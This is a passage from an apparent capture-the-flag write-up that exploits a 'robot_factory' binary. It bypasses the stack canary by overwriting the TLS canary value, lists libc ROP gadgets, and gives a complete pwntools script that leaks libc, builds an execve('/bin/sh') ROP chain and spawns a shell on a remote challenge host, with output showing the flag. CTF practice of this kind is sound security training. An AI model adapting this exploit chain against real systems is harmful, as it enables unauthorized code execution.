We will then need to write 2408 characters before overwriting the stack_canary value. Don't forget that if we overwrite `fs:0x28`, we will have to overwrite the saved canary on the stack in `do_string` (`[rbp-0x8]`) with the same value ! Otherwise, `__stack_chk_fail` will be called because `[rbp-0x8]` will not be equal to `fs:0x28`.

Now, let's say we overwrite those two values with 'AAAAAAAA' and let's find at wich offset we will control RIP. To do this, I will put 8*'A' in `robot->element1` and increment the multiplier in `robot->element2`.

After a quick research time, we can deduce an input that will overwrite `[rbp-0x8]` and `fs:0x28` with the same value and let us control RIP :

```py
payload = b"A" * 40    # TCB + [rbp-0x8] (from do_string)
payload += b'BBBBBBBB' # RIP
payload = payload.ljust(120, b'B') 

multiplier = 20

final = payload * multiplier
```

Let's find interesting gadgets and p our ret2libc ! 


## ret2libc gadgets and payload

We now need to find our gadgets to perform our ROP/ret2libc. We will search in the libc to have more potential gadgets.

```bash

$ ROPgadget --binary ./libc.so.6 | grep ": ret$"
0x0000000000025679 : ret
$ ROPgadget --binary ./libc.so.6 | grep ": pop rdi ; ret$"
0x0000000000026b72 : pop rdi ; ret
$ ROPgadget --binary ./libc.so.6 | grep ": pop rsi ; ret"
0x0000000000027529 : pop rsi ; ret
$ ROPgadget --binary ./libc.so.6 | grep ": pop rdx ; .* ret"
0x00000000001826b6 : pop rdx ; add eax, 0x83480000 ; ret 0x4910
0x0000000000054de9 : pop rdx ; add rsp, 0x38 ; pop rbx ; pop rbp ; ret
0x0000000000117af0 : pop rdx ; add rsp, 0x38 ; ret
0x00000000000da21e : pop rdx ; cmc ; sub byte ptr [rax - 0x77], cl ; retf 0xc148
0x00000000000bfa9a : pop rdx ; idiv bh ; pop rdx ; xor eax, eax ; pop rbp ; pop r12 ; ret
0x000000000011cdeb : pop rdx ; or byte ptr [rcx - 0xa], al ; ret
0x00000000000aac49 : pop rdx ; or dword ptr [rax], eax ; add bh, dh ; ret
0x000000000011c371 : pop rdx ; pop r12 ; ret
0x0000000000162866 : pop rdx ; pop rbx ; ret
0x00000000001056fd : pop rdx ; pop rcx ; pop rbx ; ret
0x0000000000130af2 : pop rdx ; sub byte ptr [rsi], al ; add byte ptr [rax + 0xf], cl ; ret 0xfc3
0x00000000000d27a5 : pop rdx ; test al, 0xf0 ; jne 0xd27d0 ; lea rax, [rdi - 0x10] ; ret
0x00000000000a2529 : pop rdx ; xor eax, eax ; pop rbp ; pop r12 ; ret
```

There is no `pop rdx ; ret` so we will take `pop rdx ; pop r12 ; ret`. We can then complete our solving script.

**NB** : for some reason, `system("/bin/sh")` was not working, probably because of the TCB overwrite, so we will use `execve("/bin/sh", NULL, NULL)`.

## Final solving script

Our final script now looks like this:

```python
elf = ELF('./robot_factory')
libc = ELF('./libc.so.6')

# context.log_level = "DEBUG"

r = remote('167.172.49.117', 30563)
# r = elf.process()

############################ LIBC LEAK ############################
r.sendlineafter(b' (n/s) > ', b's')
r.sendlineafter(b' (a/s/m) > ', b'a')

# Sending 104 bytes to leak the libc
r.sendlineafter(b'1: ', b'A' * 96)
r.sendlineafter(b'2: ', b'B' * 8)

leak = r.recvuntil(b'\n\0', drop=True).split(b' ')[-1]
leak = leak.replace(b'A', b'').replace(b'B', b'')
log.success(f"leak : {leak}")

libc_base = leak.ljust(8, b'\x00')
libc_base = u64(libc_base) - 0x9a00b
log.success(f'glibc base address : {hex(libc_base)}')

############################ GADGETS ############################
ret         = p64(libc_base + 0x025679) # ret
pop_rdi     = p64(libc_base + 0x026b72) # pop rdi ; ret
pop_rsi     = p64(libc_base + 0x027529) # pop rsi ; ret
pop_rdx_rbx = p64(libc_base + 0x11c371) # pop rdx ; pop r12 ; ret

execve_addr = p64(libc_base + libc.sym['execve'])
binsh_addr  = p64(libc_base + next(libc.search(b'/bin/sh')))

######################## OVERFLOW AND ROP ########################
r.sendline(b's')
r.sendlineafter(b' (a/s/m) > ', b'm')

# tcbhead_t.stack_guard overwrite
rop = b'A' * 40

# execve("/bin/sh", NULL, NULL)
rop += pop_rdi
rop += binsh_addr
rop += pop_rsi
rop += p64(0)
rop += pop_rdx_rbx
rop += p64(0)
rop += p64(0)
rop += execve_addr
rop = rop.ljust(120, b'B')

########### GET SHELL ###########
r.sendlineafter(b'1: ', rop)
r.sendlineafter(b'size: ', b'20')
r.recv()
r.interactive("pwned ~$ ")
```

Result of execution : 

```bash
$ python3 solve.py
[*] '/root/htb_pwn_robot_factory/robot_factory'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  b'.'
[*] '/root/htb_pwn_robot_factory/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 64.227.38.214 on port 31965: Done
[+] leak : b'\x0bpU\x06\xcc\x7f'
[+] glibc base address : 0x7fcc064bd000
[*] Switching to interactive mode
pwned ~$ id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
pwned ~$ cat flag.txt
HTB{th3_r0b0t5_4r3_0utt4_c0ntr0l!}
[*] Got EOF while reading in interactive
[*] Closed connection to 64.227.38.214 port 31965
```
